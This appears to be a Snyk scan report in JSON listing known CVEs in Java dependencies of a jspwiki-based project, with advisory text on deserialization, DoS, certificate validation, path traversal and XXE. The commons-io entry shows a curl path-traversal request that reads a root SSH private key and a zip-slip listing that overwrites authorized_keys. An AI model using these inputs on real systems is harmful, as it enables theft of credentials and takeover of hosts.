{
  "vulnerabilities": [
    {
      "id": "SNYK-JAVA-COMGOOGLECODEGSON-1730327",
      "title": "Deserialization of Untrusted Data",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:H",
      "credit": [
        "Marcono1234"
      ],
      "semver": {
        "vulnerable": [
          "[2.2.3,2.8.9)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.8.9"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.5,
      "functions": [
        {
          "version": [
            "[2.2.3,2.8.9)"
          ],
          "functionId": {
            "filePath": "com/google/gson/internal/LazilyParsedNumber.java",
            "className": "LazilyParsedNumber",
            "functionName": "writeReplace"
          }
        },
        {
          "version": [
            "[2.2.5,2.8.9)"
          ],
          "functionId": {
            "filePath": "com/google/gson/internal/LinkedHashTreeMap.java",
            "className": "LinkedHashTreeMap",
            "functionName": "writeReplace"
          }
        },
        {
          "version": [
            "[2.2.4,2.8.9)"
          ],
          "functionId": {
            "filePath": "com/google/gson/internal/LinkedTreeMap.java",
            "className": "LinkedTreeMap",
            "functionName": "writeReplace"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "com.google.code.gson:gson",
      "references": [
        {
          "url": "https://github.com/google/gson/commit/a0090c8382c12531d377002ad9f7717c0197dc5d",
          "title": "GitHub Commit Introducing Vulnerable Method"
        },
        {
          "url": "https://github.com/google/gson/pull/1991/commits",
          "title": "GitHub Fix Commit"
        },
        {
          "url": "https://github.com/google/gson/pull/1991",
          "title": "GitHub PR"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-09-10T01:12:00.618751Z"
        },
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-06-11T11:01:55.201989Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-04-13T13:31:21.755537Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data via the `writeReplace()` method in internal classes, which may allow a denial of service attack if combined with another exploit.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.google.code.gson:gson` to version 2.8.9 or higher.\n## References\n- [GitHub Commit Introducing Vulnerable Method](https://github.com/google/gson/commit/a0090c8382c12531d377002ad9f7717c0197dc5d)\n- [GitHub Fix Commit](https://github.com/google/gson/pull/1991/commits)\n- [GitHub PR](https://github.com/google/gson/pull/1991)\n",
      "epssDetails": {
        "percentile": "0.50500",
        "probability": "0.00153",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-25647"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "packageName": "com.google.code.gson:gson",
      "proprietary": true,
      "creationTime": "2021-10-12T11:59:56.357926Z",
      "functions_new": [
        {
          "version": [
            "[2.2.3,2.8.9)"
          ],
          "functionId": {
            "className": "com.google.gson.internal.LazilyParsedNumber",
            "functionName": "writeReplace"
          }
        },
        {
          "version": [
            "[2.2.5,2.8.9)"
          ],
          "functionId": {
            "className": "com.google.gson.internal.LinkedHashTreeMap",
            "functionName": "writeReplace"
          }
        },
        {
          "version": [
            "[2.2.4,2.8.9)"
          ],
          "functionId": {
            "className": "com.google.gson.internal.LinkedTreeMap",
            "functionName": "writeReplace"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2021-10-11T16:57:22Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "com.google.code.gson",
        "artifactId": "gson"
      },
      "publicationTime": "2021-11-02T17:41:17Z",
      "modificationTime": "2023-04-13T13:31:21.755537Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "com.google.code.gson:gson@2.8.5"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.0",
        "com.google.code.gson:gson@2.8.9"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.google.code.gson:gson",
      "version": "2.8.5"
    },
    {
      "id": "SNYK-JAVA-COMMONSCODEC-561518",
      "title": "Information Exposure",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
      "credit": [
        "Hanson Char"
      ],
      "semver": {
        "vulnerable": [
          "[,1.13)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "1.13"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "low",
      "cvssScore": 3.7,
      "functions": [
        {
          "version": [
            "[1.5,1.13)"
          ],
          "functionId": {
            "filePath": "org/apache/commons/codec/binary/Base32.java",
            "className": "Base32",
            "functionName": "decode"
          }
        },
        {
          "version": [
            "[,1.13)"
          ],
          "functionId": {
            "filePath": "org/apache/commons/codec/binary/Base64.java",
            "className": "Base64",
            "functionName": "decode"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-codec:commons-codec",
      "references": [
        {
          "url": "https://github.com/apache/commons-codec/commit/48b615756d1d770091ea3322eefc08011ee8b113",
          "title": "GitHub Commit"
        },
        {
          "url": "https://issues.apache.org/jira/browse/CODEC-134",
          "title": "Jira Issue"
        }
      ],
      "cvssDetails": [],
      "description": "## Overview\n[commons-codec:commons-codec](https://commons.apache.org/proper/commons-codec) is a package that contains simple encoder and decoders for various formats such as Base64 and Hexadecimal.\n\nAffected versions of this package are vulnerable to Information Exposure. When there is no byte array value that can be encoded into a string the Base32 implementation does not reject it, and instead decodes it into an arbitrary value which can be re-encoded again using the same implementation. This allows for information exposure exploits such as tunneling additional information via seemingly valid base 32 strings.\n## Remediation\nUpgrade `commons-codec:commons-codec` to version 1.13 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/commons-codec/commit/48b615756d1d770091ea3322eefc08011ee8b113)\n- [Jira Issue](https://issues.apache.org/jira/browse/CODEC-134)\n",
      "epssDetails": null,
      "identifiers": {
        "CVE": [],
        "CWE": [
          "CWE-200"
        ]
      },
      "packageName": "commons-codec:commons-codec",
      "proprietary": false,
      "creationTime": "2020-03-30T17:22:24.164713Z",
      "functions_new": [
        {
          "version": [
            "[1.5,1.13)"
          ],
          "functionId": {
            "className": "org.apache.commons.codec.binary.Base32",
            "functionName": "decode"
          }
        },
        {
          "version": [
            "[,1.13)"
          ],
          "functionId": {
            "className": "org.apache.commons.codec.binary.Base64",
            "functionName": "decode"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2020-03-30T17:20:23Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-codec",
        "artifactId": "commons-codec"
      },
      "publicationTime": "2012-03-03T17:20:25Z",
      "modificationTime": "2020-06-12T14:37:04.472432Z",
      "socialTrendAlert": false,
      "severityWithCritical": "low",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "net.sourceforge:akismet-java@1.02",
        "commons-codec:commons-codec@1.3"
      ],
      "upgradePath": [],
      "isUpgradable": false,
      "isPatchable": false,
      "name": "commons-codec:commons-codec",
      "version": "1.3"
    },
    {
      "id": "SNYK-JAVA-COMMONSFILEUPLOAD-3326457",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
      "credit": [
        "Jakob Ackermann"
      ],
      "semver": {
        "vulnerable": [
          "[1.0-beta-1, 1.5)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "1.5"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-fileupload:commons-fileupload",
      "references": [
        {
          "url": "https://lists.apache.org/thread/4xl4l09mhwg4vgsk7dxqogcjrobrrdoy",
          "title": "Apache Mailing List"
        },
        {
          "url": "https://github.com/apache/commons-fileupload/commit/0a306f75949f2e9f5f92c400cad39d20117a2eb0",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/apache/commons-fileupload/commit/e20c04990f7420ca917e96a84cec58b13a1b3d17",
          "title": "GitHub Commit"
        },
        {
          "url": "https://github.com/apache/tomcat/commit/063e2e81ede50c287f737cc8e2915ce7217e886e",
          "title": "GitHub Commit (Tomcat)"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 6.5,
          "modificationTime": "2023-02-28T14:13:08.790066Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-03-02T01:10:12.884606Z"
        },
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-03-11T11:02:24.927537Z"
        }
      ],
      "description": "## Overview\n[commons-fileupload:commons-fileupload](https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload) is a component that provides a simple yet flexible means of adding support for multipart file upload functionality to servlets and web applications.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) when an attacker sends a large number of request parts in a series of uploads or a single multipart upload.\r\n\r\n**NOTE:** After upgrading to the fixed version, the `setFileCountMax()` must be explicitly set to avoid this vulnerability.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `commons-fileupload:commons-fileupload` to version 1.5 or higher.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/4xl4l09mhwg4vgsk7dxqogcjrobrrdoy)\n- [GitHub Commit](https://github.com/apache/commons-fileupload/commit/0a306f75949f2e9f5f92c400cad39d20117a2eb0)\n- [GitHub Commit](https://github.com/apache/commons-fileupload/commit/e20c04990f7420ca917e96a84cec58b13a1b3d17)\n- [GitHub Commit (Tomcat)](https://github.com/apache/tomcat/commit/063e2e81ede50c287f737cc8e2915ce7217e886e)\n",
      "epssDetails": {
        "percentile": "0.70204",
        "probability": "0.00408",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-24998"
        ],
        "CWE": [
          "CWE-400"
        ]
      },
      "packageName": "commons-fileupload:commons-fileupload",
      "proprietary": false,
      "creationTime": "2023-02-21T08:19:49.294883Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-02-21T08:00:22Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-fileupload",
        "artifactId": "commons-fileupload"
      },
      "publicationTime": "2023-02-21T09:23:34.093821Z",
      "modificationTime": "2023-03-11T11:02:24.927537Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "commons-fileupload:commons-fileupload@1.4"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.12.0",
        "commons-fileupload:commons-fileupload@1.5"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-fileupload:commons-fileupload",
      "version": "1.4"
    },
    {
      "id": "SNYK-JAVA-COMMONSHTTPCLIENT-30083",
      "title": "Improper Certificate Validation",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[,3.1-jenkins-3)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "3.1-jenkins-3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.4,
      "functions": [
        {
          "version": [
            "[2.0, 3.1)"
          ],
          "functionId": {
            "filePath": "org/apache/commons/httpclient/protocol/SSLProtocolSocketFactory.java",
            "className": "SSLProtocolSocketFactory",
            "functionName": "createSocket"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-httpclient:commons-httpclient",
      "references": [
        {
          "url": "https://github.com/jenkinsci/lib-commons-httpclient/commit/a4427f1a6e57ff5250d5b9699948f4ccbb0efef1",
          "title": "GitHub Commit"
        },
        {
          "url": "https://issues.apache.org/jira/browse/HTTPCLIENT-1265",
          "title": "Jira Issue"
        },
        {
          "url": "http://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf",
          "title": "The University of Texas"
        },
        {
          "url": "https://exchange.xforce.ibmcloud.com/vulnerabilities/79984",
          "title": "X-force Vulnerability Report"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
          "cvssV3BaseScore": 5.4,
          "modificationTime": "2023-02-09T11:24:12.775159Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "low",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 3.7,
          "modificationTime": "2022-09-01T17:13:01.019923Z"
        }
      ],
      "description": "## Overview\n[commons-httpclient:commons-httpclient](https://mvnrepository.com/artifact/commons-httpclient/commons-httpclient) is a HttpClient component of the Apache HttpComponents project.\n\nAffected versions of this package are vulnerable to Improper Certificate Validation due to not verifying that the requesting server hostname matches a domain name in the subject's `Common Name (CN)` or `subjectAltName` field of the X.509 certificate. This allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.\r\n\r\n**NOTE:** This plugin has been deprecated, but a fix has been released in version 3.1-jenkins-3 on a special Jenkins fork of the project.\n## Remediation\nUpgrade `commons-httpclient:commons-httpclient` to version 3.1-jenkins-3 or higher.\n## References\n- [GitHub Commit](https://github.com/jenkinsci/lib-commons-httpclient/commit/a4427f1a6e57ff5250d5b9699948f4ccbb0efef1)\n- [Jira Issue](https://issues.apache.org/jira/browse/HTTPCLIENT-1265)\n- [The University of Texas](http://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf)\n- [X-force Vulnerability Report](https://exchange.xforce.ibmcloud.com/vulnerabilities/79984)\n",
      "epssDetails": {
        "percentile": "0.60643",
        "probability": "0.00238",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2012-5783"
        ],
        "CWE": [
          "CWE-295"
        ]
      },
      "packageName": "commons-httpclient:commons-httpclient",
      "proprietary": false,
      "creationTime": "2016-12-25T16:51:47Z",
      "functions_new": [
        {
          "version": [
            "[2.0, 3.1)"
          ],
          "functionId": {
            "className": "org.apache.commons.httpclient.protocol.SSLProtocolSocketFactory",
            "functionName": "createSocket"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2012-11-04T22:55:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-httpclient",
        "artifactId": "commons-httpclient"
      },
      "publicationTime": "2013-03-25T16:51:47Z",
      "modificationTime": "2023-02-09T11:24:12.775159Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "commons-httpclient:commons-httpclient@3.1"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.12.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-httpclient:commons-httpclient",
      "version": "3.1"
    },
    {
      "id": "SNYK-JAVA-COMMONSHTTPCLIENT-31660",
      "title": "Man-in-the-Middle (MitM)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 4.3,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-httpclient:commons-httpclient",
      "references": [
        {
          "url": "https://github.com/apache/httpcomponents-client/commit/6e14fc146a66e0f3eb362f45f95d1a58ee18886a",
          "title": "GitHub Commit"
        },
        {
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-6153",
          "title": "NVD"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
          "cvssV3BaseScore": 4.3,
          "modificationTime": "2023-02-09T11:24:12.416149Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
          "cvssV3BaseScore": 5.4,
          "modificationTime": "2023-02-09T11:24:57.645898Z"
        }
      ],
      "description": "## Overview\n[commons-httpclient:commons-httpclient](https://mvnrepository.com/artifact/commons-httpclient/commons-httpclient) is a HttpClient component of the Apache HttpComponents project.\n\nAffected versions of this package are vulnerable to Man-in-the-Middle (MitM) due to not verifing the requesting server's hostname agains existing domain names in the SSL Certificate. The `AbstractVerifier` does not properly verify that the server hostname matches a domain name in the subject's `Common Name (CN)` or `subjectAltName` field of the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via a certificate with a subject that specifies a common name in a field that is not the CN field.  \r\n\r\n**NOTE:** this issue exists because of an incomplete fix for [CVE-2012-5783](SNYK-JAVA-COMMONSHTTPCLIENT-30083).\n## Remediation\nThere is no fixed version for `commons-httpclient:commons-httpclient`.\n## References\n- [GitHub Commit](https://github.com/apache/httpcomponents-client/commit/6e14fc146a66e0f3eb362f45f95d1a58ee18886a)\n- [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-6153)\n",
      "epssDetails": {
        "percentile": "0.50674",
        "probability": "0.00154",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2012-6153"
        ],
        "CWE": [
          "CWE-20"
        ]
      },
      "packageName": "commons-httpclient:commons-httpclient",
      "proprietary": false,
      "creationTime": "2017-02-22T07:28:21.771000Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2014-09-04T17:55:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-httpclient",
        "artifactId": "commons-httpclient"
      },
      "publicationTime": "2018-04-08T12:56:14Z",
      "modificationTime": "2023-02-09T11:24:57.645898Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "commons-httpclient:commons-httpclient@3.1"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.12.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-httpclient:commons-httpclient",
      "version": "3.1"
    },
    {
      "id": "SNYK-JAVA-COMMONSIO-1277109",
      "title": "Directory Traversal",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:F",
      "credit": [
        "Lukas Euler"
      ],
      "semver": {
        "vulnerable": [
          "[0, 2.7)"
        ]
      },
      "exploit": "Functional",
      "fixedIn": [
        "2.7"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.3,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "commons-io:commons-io",
      "references": [
        {
          "url": "https://github.com/apache/commons-io/commit/fe7543eee5cd4b2f9e78aa44c31031b68eba204d",
          "title": "GitHub Commit"
        },
        {
          "url": "https://issues.apache.org/jira/browse/IO-556",
          "title": "Jira Issue"
        },
        {
          "url": "https://github.com/AlAIAL90/CVE-2021-29425",
          "title": "PoC"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
          "cvssV3BaseScore": 4.3,
          "modificationTime": "2022-05-03T22:22:20.737922Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
          "cvssV3BaseScore": 4.8,
          "modificationTime": "2022-11-27T21:15:33.088611Z"
        },
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
          "cvssV3BaseScore": 4.8,
          "modificationTime": "2022-10-28T01:10:29.412127Z"
        }
      ],
      "description": "## Overview\n[commons-io:commons-io](https://search.maven.org/artifact/commons-io/commons-io) is a The Apache Commons IO library contains utility classes, stream implementations, file filters, file comparators, endian transformation classes, and much more.\n\nAffected versions of this package are vulnerable to Directory Traversal via calling the method FileNameUtils.normalize using an improper string like `//../foo` or `\\\\..\\foo`, which may allow access to files in the parent directory.\n\n## Details\n\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\n\nDirectory Traversal vulnerabilities can be generally divided into two types:\n\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\n\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\n\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\n\n```\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n```\n**Note** `%2e` is the URL encoded version of `.` (dot).\n\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \n\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n2018-04-15 22:04:29 .....           19           19  good.txt\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\n```\n\n## Remediation\nUpgrade `commons-io:commons-io` to version 2.7 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/commons-io/commit/fe7543eee5cd4b2f9e78aa44c31031b68eba204d)\n- [Jira Issue](https://issues.apache.org/jira/browse/IO-556)\n- [PoC](https://github.com/AlAIAL90/CVE-2021-29425)\n",
      "epssDetails": {
        "percentile": "0.57769",
        "probability": "0.00210",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2021-29425"
        ],
        "CWE": [
          "CWE-22",
          "CWE-20"
        ],
        "GHSA": [
          "GHSA-gwrp-pvrq-jmwv"
        ]
      },
      "packageName": "commons-io:commons-io",
      "proprietary": false,
      "creationTime": "2021-04-27T10:51:05.462338Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2021-04-26T16:04:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "commons-io",
        "artifactId": "commons-io"
      },
      "publicationTime": "2021-04-27T14:26:12Z",
      "modificationTime": "2022-11-27T21:15:33.088611Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "commons-io:commons-io@2.4"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "commons-io:commons-io",
      "version": "2.4"
    },
    {
      "id": "SNYK-JAVA-JAVAXSERVLET-30449",
      "title": "XML External Entity (XXE) Injection",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
      "credit": [
        "David Jorm"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 7.3,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "javax.servlet:jstl",
      "references": [
        {
          "url": "http://mail-archives.us.apache.org/mod_mbox/www-announce/201502.mbox/%3C82207A16-6348-4DEE-877E-F7B87292576A@apache.org%3E",
          "title": "Apache Mail Archive"
        },
        {
          "url": "https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0254",
          "title": "NVD"
        },
        {
          "url": "https://access.redhat.com/security/cve/CVE-2015-0254",
          "title": "RedHat CVE Database"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
          "cvssV3BaseScore": 7.3,
          "modificationTime": "2023-02-09T11:23:41.455575Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:L",
          "cvssV3BaseScore": 7.6,
          "modificationTime": "2022-09-01T18:14:00.387759Z"
        }
      ],
      "description": "## Overview\n[javax.servlet:jstl](https://mvnrepository.com/artifact/javax.servlet/jstl) is a collection of useful JSP tags which encapsulates the core functionality common to many JSP applications.\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection. Apache Standard Taglibs before 1.2.3 allows remote attackers to execute arbitrary code or conduct external XML entity (XXE) attacks via a crafted XSLT extension in a `<x:parse>` or `<x:transform>` JSTL XML tag.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system 